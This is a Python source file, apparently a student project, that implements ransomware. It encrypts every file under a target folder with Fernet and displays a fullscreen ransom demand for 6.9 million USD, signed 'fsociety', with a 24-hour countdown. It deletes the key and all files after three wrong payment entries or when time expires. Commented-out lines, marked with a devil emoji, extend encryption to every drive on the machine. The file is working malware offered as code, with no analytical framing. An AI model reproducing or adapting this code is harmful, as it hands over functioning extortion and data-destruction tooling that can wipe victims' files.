# working
import os
from cryptography import fernet
import time
from tkinter import *
from tkinter import messagebox
import win32api
import sys

# code for encryption
# key generation
key = fernet.Fernet.generate_key()

# making a Ferner object
fer = fernet.Fernet(key)

# writing the key into file to decrypt files
os.chdir("D:\BE\SEM 3\Python_indi")
with open('key.key','wb') as f1:
    f1.write(key)
 
# uncomment below three line to encrypt each and every file in system 😈
# drives = win32api.GetLogicalDriveStrings()
# drives = drives.split('\000')[:-1]

# for k in drives:
for i in os.walk("D:\BE\SEM 3\Python_indi\\test"):
    for j in i[2]:
        file_path = os.path.join(i[0], j)
        s = ""
        try:
            with open(file_path, 'rb') as f:
                s = f.read()
            s = fer.encrypt(s)
            with open(file_path,'wb') as f1:
                f1.write(s)
            print(f'{j} encrypted')
        except Exception as e:
            print()
            print(f"Error reading {file_path}: {e}")
            print()

# gui popup code
# Create the interface object
clockWindow = Tk()
clockWindow.geometry("1920x1080")
clockWindow.title("Ransomeware")
clockWindow.configure(background='#fff')

# Declare variables
hourString = StringVar()
minuteString = StringVar()
secondString = StringVar()
dataString = StringVar()

# Set strings to default value
hourString.set("24")
minuteString.set("0")
secondString.set("0")

# Get user input
main_title = Label(clockWindow, text="Your files are encrypted",font=("Calibri", 30, "bold"), bg="#fff")
main_title.place(x=550, y=10)

warning = Label(clockWindow, text="To get the key to decrypt files,you have to pay ", font=("Calibri", 15, ""), bg="#fff")
warning.place(x=400, y=100)

warning1 = Label(clockWindow, text=" 6.9 million USD ",font=("Calibri", 15, ""), bg="#fff", fg="red")
warning1.place(x=790, y=100)

warning2 = Label(clockWindow, text="if payment is not made", font=("Calibri", 15, ""), bg="#fff")
warning2.place(x=930, y=100)

warning3 = Label(clockWindow, text="Your all data will be ", font=("Calibri", 15, ""), bg="#fff")
warning3.place(x=630, y=130)

warning4 = Label(clockWindow, text="erased", font=("Calibri", 15, ""), bg="#fff", fg="red")
warning4.place(x=805, y=130)

warning5 = Label(clockWindow, text="More instructions forthcoming. -fsociety.", font=("Calibri", 15, ""), bg="#fff")
warning5.place(x=580, y=160)

time_title = Label(clockWindow, text="Time left : ",font=("Calibri", 40, ""), bg="#fff")
time_title.place(x=430, y=280)

hourTextbox = Label(clockWindow, width=3, font=("Calibri", 40, ""), textvariable=hourString, bg='#fff', fg='red')
hourTextbox.place(x=650, y=280)

col1 = Label(clockWindow, width=2, font=("Calibri", 40, ""), text="H", bg="#fff")
col1.place(x=720, y=280)

minuteTextbox = Label(clockWindow, width=3, font=("Calibri", 40, ""), textvariable=minuteString, bg='#fff', fg='red')
minuteTextbox.place(x=765, y=280)

col2 = Label(clockWindow, width=2, font=("Calibri", 40, ""), text="m", bg="#fff")
col2.place(x=840, y=280)

secondTextbox = Label(clockWindow, width=3, font=("Calibri", 40, ""), textvariable=secondString, bg='#fff', fg='red')
secondTextbox.place(x=890, y=280)

col3 = Label(clockWindow, width=2, font=("Calibri", 40, ""), text="s", bg="#fff")
col3.place(x=960, y=280)

dataTextbox = Entry(clockWindow, width=20, font=("Calibri", 20, ""), textvariable=dataString, bg="#B6D0E2")
dataTextbox.place(x=600, y=380)
flag = 3
def checkPayment():
    if dataString.get() == '6.9 million':
            sucess = Label(clockWindow, text='Your files will be decrypted soon...', font=("Calibri", 35, ""), bg="#fff",fg="green")
            sucess.place(x=400, y=500)

            # code for decrypting files
            os.chdir("D:\BE\SEM 3\Python_indi")
            with open('key.key','rb') as f:
                key = f.read()
            fer = fernet.Fernet(key)
            # uncomment below three line sto decrypt all files in system
            # drives = win32api.GetLogicalDriveStrings()
            # drives = drives.split('\000')[:-1]

            # for k in drives:
            for i in os.walk("D:\BE\SEM 3\Python_indi\\test"):
                for j in i[2]:
                        file_path = os.path.join(i[0], j)
                        s = ""
                        try:
                            with open(file_path, 'rb') as f:
                                s = f.read()
                            s = fer.decrypt(s)
                            with open(file_path,'wb') as f1:
                                f1.write(s)
                            print(f'{j} decryped')
                        except Exception as e:
                            print()
                            # print(f"Error decrypting {file_path}: {e}")
                            print()
            # deletes key after all files are decrypted
            os.remove('key.key')
            sys.exit()
    else:
         global flag 
         flag -= 1 
    if flag == 0:
        os.chdir("D:\BE\SEM 3\Python_indi")
        os.remove('key.key')
        for i in os.walk("D:\BE\SEM 3\Python_indi\\test"):
            for j in i[2]:
                    file_path = os.path.join(i[0], j)
                    os.remove(file_path)
        messagebox.showinfo("", "All Files are Deleted")
Checkbutton = Button(clockWindow,text="pay ransome",command=checkPayment)
Checkbutton.place(x=600,y=450)
# making timer method
def runTimer():
    flag = 3
    try:
        clockTime = int(hourString.get())*3600 + \
            int(minuteString.get())*60 + int(secondString.get())
    except:
        print("Incorrect values")

    while (clockTime > -1):
        totalMinutes, totalSeconds = divmod(clockTime, 60)
        totalHours = 0
        if (totalMinutes > 60):
            totalHours, totalMinutes = divmod(totalMinutes, 60)
        hourString.set("{0:2d}".format(totalHours))
        minuteString.set("{0:2d}".format(totalMinutes))
        secondString.set("{0:2d}".format(totalSeconds))

        # Update the interface
        clockWindow.update()
        time.sleep(0.9)
        # Let the user know if the timer has expired
        if (clockTime == 0):
            # deletes key after all files are decrypted
            os.chdir("D:\BE\SEM 3\Python_indi")
            os.remove('key.key')
            for i in os.walk("D:\BE\SEM 3\Python_indi\\test"):
                for j in i[2]:
                        file_path = os.path.join(i[0], j)
                        os.remove(file_path)
            messagebox.showinfo("", "All Files are Deleted")
        clockTime -= 1

runTimer()
# Keep looping
clockWindow.mainloop()